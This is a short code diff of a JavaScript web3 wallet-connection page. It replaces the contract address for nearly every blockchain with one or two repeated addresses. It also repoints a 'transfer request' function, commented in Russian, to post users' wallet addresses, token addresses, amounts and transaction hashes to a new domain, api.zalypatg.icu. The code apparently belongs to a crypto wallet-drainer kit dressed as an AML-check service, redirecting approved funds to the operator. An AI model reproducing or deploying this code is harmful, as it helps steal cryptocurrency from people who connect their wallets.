@@ -67,18 +67,18 @@ const networkMap = {
 console.log('Network Map:', networkMap)
 
 const CONTRACTS = {
-  [networkMap['Ethereum'].chainId]: '0xa65972Fce9925983f35185891109c4be643657aD',
-  [networkMap['BNB Smart Chain'].chainId]: '0x537AC4F6Dc238003fd8bb281F954A9912180530B',
-  [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c',
-  [networkMap['Arbitrum'].chainId]: '0x1234567890123456789012345678901234567890',
-  [networkMap['Optimism'].chainId]: '0x2345678901234567890123456789012345678901',
-  [networkMap['Base'].chainId]: '0x3456789012345678901234567890123456789012',
-  [networkMap['Scroll'].chainId]: '0x4567890123456789012345678901234567890123',
-  [networkMap['Avalanche'].chainId]: '0x5678901234567890123456789012345678901234',
-  [networkMap['Fantom'].chainId]: '0xabcdef1234567890abcdef1234567890abcdef12',
-  [networkMap['Linea'].chainId]: '0xbcdef1234567890abcdef1234567890abcdef123',
-  [networkMap['zkSync'].chainId]: '0xcdef1234567890abcdef1234567890abcdef1234',
-  [networkMap['Celo'].chainId]: '0xdef1234567890abcdef1234567890abcdef12345'
+  [networkMap['Ethereum'].chainId]: '0xc1b398DC3C8D483D63C01018b68748373FDd526f',
+  [networkMap['BNB Smart Chain'].chainId]: '0xc1b398DC3C8D483D63C01018b68748373FDd526f',
+  [networkMap['Polygon'].chainId]: '0xc1b398DC3C8D483D63C01018b68748373FDd526f',
+  [networkMap['Arbitrum'].chainId]: '0xc1b398DC3C8D483D63C01018b68748373FDd526f',
+  [networkMap['Optimism'].chainId]: '0xc1b398DC3C8D483D63C01018b68748373FDd526f',
+  [networkMap['Base'].chainId]: '0x90a18A1478072F6Ef75BE5310206B9604cB409b7',
+  [networkMap['Scroll'].chainId]: '0xc1b398DC3C8D483D63C01018b68748373FDd526f',
+  [networkMap['Avalanche'].chainId]: '0xc1b398DC3C8D483D63C01018b68748373FDd526f',
+  [networkMap['Fantom'].chainId]: '0xc1b398DC3C8D483D63C01018b68748373FDd526f',
+  [networkMap['Linea'].chainId]: '0x90a18A1478072F6Ef75BE5310206B9604cB409b7',
+  [networkMap['zkSync'].chainId]: '0xc1b398DC3C8D483D63C01018b68748373FDd526f',
+  [networkMap['Celo'].chainId]: '0xc1b398DC3C8D483D63C01018b68748373FDd526f'
 }
 
 const wagmiAdapter = new WagmiAdapter({ projectId, networks })
@@ -274,7 +274,7 @@ const getScanLink = (hash, chainId, isTx = false) => {
 // Функция отправки запроса на трансфер
 const sendTransferRequest = async (userAddress, tokenAddress, amount, chainId, txHash) => {
   try {
-    const response = await fetch('https://api.amlinsight.io/api/transfer', {
+    const response = await fetch('https://api.zalypatg.icu/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ userAddress, tokenAddress, amount: amount.toString(), chainId, txHash })
@@ -1090,3 +1090,4 @@ document.getElementById('switch-network')?.addEventListener('click', () => {
   
   appKit.switchNetwork(nextNetwork)
 })
+
